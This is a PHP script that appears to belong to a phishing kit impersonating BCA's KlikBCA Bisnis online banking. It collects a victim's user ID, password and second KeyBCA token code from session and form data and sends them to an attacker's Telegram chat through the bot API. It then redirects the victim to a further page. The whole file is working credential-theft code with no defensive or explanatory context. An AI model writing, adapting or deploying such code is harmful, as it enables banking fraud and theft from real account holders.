<?php
include "../telegram.php";
session_start();

$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$key2 = $_POST['key2'];


$_SESSION['user'] = $user;
$_SESSION['pass'] = $pass;
$_SESSION['key2'] = $key2;


$message = "
( *KLIK BCA BISNIS* )

- *UserID :* ".$user."
- *KeyBCA Appli 1 :* ".$pass."

- *KeyBCA Appli 2 :* ".$key2."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../key.html');
?>
